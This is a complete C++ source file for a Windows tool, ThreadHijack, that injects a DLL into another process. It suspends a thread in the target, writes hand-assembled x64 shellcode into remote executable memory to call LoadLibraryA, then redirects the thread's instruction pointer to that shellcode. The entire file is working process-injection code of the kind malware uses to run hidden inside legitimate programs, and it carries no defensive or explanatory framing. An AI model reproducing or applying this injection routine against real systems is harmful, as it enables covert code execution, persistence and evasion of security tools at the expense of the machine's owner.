// ThreadHijack.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

bool DoInjection(HANDLE hProcess, HANDLE hThread, PCSTR dllPath) {
	BYTE code[] = {
		// sub rsp, 28h
		0x48, 0x83, 0xec, 0x28,
		// mov [rsp + 18], rax
		0x48, 0x89, 0x44, 0x24, 0x18,
		// mov [rsp + 10h], rcx
		0x48, 0x89, 0x4c, 0x24, 0x10,
		// mov rcx, 11111111111111111h
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		// mov rax, 22222222222222222h
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		// call rax
		0xff, 0xd0,
		// mov rcx, [rsp + 10h]
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		// mov rax, [rsp + 18h]
		0x48, 0x8b, 0x44, 0x24, 0x18,
		// add rsp, 28h
		0x48, 0x83, 0xc4, 0x28,
		// mov r11, 333333333333333333h
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
		// jmp r11
		0x41, 0xff, 0xe3
	};

	const int page_size = 1 << 12;

	auto buffer = (char*)VirtualAllocEx(hProcess, nullptr, page_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!buffer)
		return false;

	if (SuspendThread(hThread) == -1)
		return false;

	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &context)) {
		ResumeThread(hThread);
		return false;
	}

	void* loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	*(PVOID*)(code + 0x10) = (void*)(buffer + page_size / 2);
	*(PVOID*)(code + 0x1a) = loadLibraryAddress;
	*(unsigned long long*)(code + 0x34) = context.Rip;

	if (!WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr)) {
		ResumeThread(hThread);
		return false;
	}

	if (!WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, strlen(dllPath), nullptr)) {
		ResumeThread(hThread);
		return false;
	}

	context.Rip = (unsigned long long)buffer;

	if (!SetThreadContext(hThread, &context))
		return false;

	ResumeThread(hThread);
	return true;
}

int err(const char* msg) {
	printf("%s (%u)\n", msg, GetLastError());
	return 1;
}

int GetFisrtThreadProcess(int pid) {
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	THREADENTRY32 te = { sizeof(te) };
	if (!Thread32First(hSnapshot, &te)) {
		CloseHandle(hSnapshot);
		return 0;
	}

	int tid = 0;
	do {
		if (te.th32OwnerProcessID == pid) {
			tid = te.th32ThreadID;
			break;
		}
	} while (Thread32Next(hSnapshot, &te));

	CloseHandle(hSnapshot);
	return tid;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: ThreadHijack <pid> <dllPath>\n");
		return 0;
	}

	auto pid = atoi(argv[1]);

	auto hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	if (!hProcess)
		return err("Failed OpenProcess");

	DWORD tid = GetFisrtThreadProcess(pid);

	auto hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, tid);
	if (!hThread)
		return err("Failed OpenThread");

	if (!DoInjection(hProcess, hThread, argv[argc - 1]))
		return err("Failed to inject DLL");

	PostThreadMessage(tid, WM_NULL, 0, 0);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}

